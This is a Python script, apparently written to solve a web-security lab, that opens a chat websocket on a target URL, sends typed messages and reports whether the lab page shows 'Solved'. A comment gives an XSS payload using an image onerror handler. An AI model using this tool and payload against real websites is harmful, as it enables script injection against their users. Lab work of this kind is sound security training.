import requests 
import asyncio
import websockets # type: ignore
import sys
import json
import re
from rich.console import Console # type: ignore
from rich.prompt import Prompt # type: ignore


# Payload: <img src=1 onerror='alert(1)'>


# instantiate a console object 
console = Console()


# Be sure that the URL is passed with arguments at runtime
if len(sys.argv) != 2:
    print("Error parsing argument...")
    print(f"Usage: python3 {sys.argv[0]} <URL>")
    sys.exit(1)


# Adjust the URL took from arguments so that it will use wss protocol
# if not present append /chat at the end
URL = sys.argv[1]
URL_FOR_WEBSOCK = "wss://"+URL.split('//')[1]
if "/chat" not in URL_FOR_WEBSOCK:
    URL_FOR_WEBSOCK+="chat"


# instantiate a session object and make the request to retrieve the session cookie
session = requests.session()
session.get(URL)


# Function used to prettify server responses from websocket
def handle_server_response(server_response):
    found = re.search(r'"user":"(.*)","content":"(.*)"}', server_response)
    user = found.group(1)
    message = found.group(2)
    return user, message


# Here an async function is defined so that it is possible to connect to the websocket and send text
async def connect_to_websocket():
    try:
        websocket = await asyncio.wait_for(websockets.connect(URL_FOR_WEBSOCK), timeout=10)
        async with websocket:
            # Connecto to the websocket, if it fails an exception is raised and captured
            await websocket.send("READY")
            await websocket.recv()
            await websocket.send("PING")

            console.clear()
            # Block below used to interact with websocket
            # Basic functioning is that the user types a message and the response is printed
            while True:
                custom_message = Prompt.ask("[bold green]Write something[/bold green] ('exit' to close)", default="Type here")
                console.clear()
                if custom_message.lower() == "exit":
                    console.print(f"[bold yellow]Exiting ...[/bold yellow]\n")
                    break
                console.print(f"[bold magenta]MESSAGE SENT[/bold magenta]")
                console.print(f"[bold green]user:[/bold green] [underline yellow] You[/underline yellow]")
                console.print(f"[bold cyan]message:[/bold cyan] [italic white]{custom_message}[/italic white]\n")
                
                print(custom_message)
                outgoing_message = {"message": custom_message}
                await websocket.send(json.dumps(outgoing_message)) # start the connection
                response = await websocket.recv()

                await websocket.recv()
                with console.status("[yellow]WAITING FOR SERVER RESPONSE ...[/yellow]"):
                    server_response = await websocket.recv()

                user, message = handle_server_response(server_response)
                console.print(f"[bold magenta]RESPONSE FROM {user}[/bold magenta]")
                console.print(f"[bold green]user:[/bold green] [underline yellow]{user}[/underline yellow]")
                console.print(f"[bold cyan]message:[/bold cyan] [italic white]{message}[/italic white]\n")

                # Here do a request to check if lab was solved, one can check it via HTML in response
                resp_get = session.get(URL)
                if "Solved" in resp_get.text:
                    console.print(f"[bold green]XSS successful :)[/bold green]\n")
                else:
                    console.print(f"[bold red]XSS not successful :([/bold red]\n")
                    

    # Need also to handle timeout errors and generic ones        
    except asyncio.TimeoutError:
        print("Error, conection timeout :(")
    except Exception as e:
        print(f"Generic error :( {e}")


# Main
# used to call async function above
if __name__ == "__main__":
    asyncio.run(connect_to_websocket())
